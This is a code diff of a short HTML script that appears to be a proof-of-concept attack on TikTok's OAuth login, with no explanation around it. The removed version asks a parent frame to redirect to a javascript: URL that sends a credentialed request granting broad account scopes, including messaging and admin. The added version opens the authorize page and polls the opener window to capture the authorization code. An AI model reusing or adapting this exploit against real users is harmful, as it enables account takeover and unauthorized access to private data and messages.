@@ -1,6 +1,29 @@
 <script>
-parent.postMessage({
-  action: "requestRedirectionTo",
-  targetUrlStr: "javascript:(function(){function submitRequest(){var xhr=new XMLHttpRequest();xhr.open('POST','https://www.tiktok.com/passport/open/web/auth/v2/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cbizpartner.item.info%2Cuser.info.showcase%2Cuser.info.phone%2Cuser.info.profile%2Cuser.info.email%2Cuser.setting.list%2Cbiz.account.info%2Cbiz.promote.upgrade_stats%2Cmessage.list.send%2Cvideo.list.manage%2Cseries.collection.list%2Cvideo.list.private_ads.no_watermark%2Cuser.info.stats%2Clive.list%2Cuser.account.type%2Ccomment.list%2Cbiz.account.phone%2Cbiz.promote.create%2Ccomment.list.manage%2Cmessage.list.admin%2Cbizpartner.user.info%2Cuser.setting.update%2Cbiz.account.email%2Cvideo.list.no_watermark%2Cuser.account.configure&aid=1459&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin%2F&source=web&response_type=code',true);xhr.setRequestHeader('accept','application/json, text/plain, */*');xhr.setRequestHeader('accept-language','en-US,en;q=0.5');xhr.setRequestHeader('content-type','application/json');xhr.withCredentials=true;var body={};xhr.send(JSON.stringify(body));xhr.onload=function(){console.log(xhr.status,xhr.responseText);};}submitRequest();alert('Request submitted');})()"
-}, "*");
+  const clientKey = "aw8cb3204x0a1g88";
+  const redirectUri = encodeURIComponent("https://ads.tiktok.com/login");
+
+  const url = `https://www.tiktok.com/v2/auth/authorize?client_key=${clientKey}&response_type=code&scope=user.info.basic,user.info.username&redirect_uri=${redirectUri}&state=your_custom_state`;
+
+  const authWindow = window.open(url, "_blank");
+
+  (function pollOpener() {
+    if (!window.opener || window.opener.closed) return;
+    
+    try {
+      const href = window.opener.location.href;
+      
+      if (href.includes('code=')) {
+        const urlParams = new URL(href).searchParams;
+        const authCode = urlParams.get('code');
+        
+        alert("Authorization Code: " + authCode);
+        
+        return;
+      } else {
+        setTimeout(pollOpener, 500);
+      }
+    } catch (e) {
+      setTimeout(pollOpener, 500); 
+    }
+  })();
 </script>
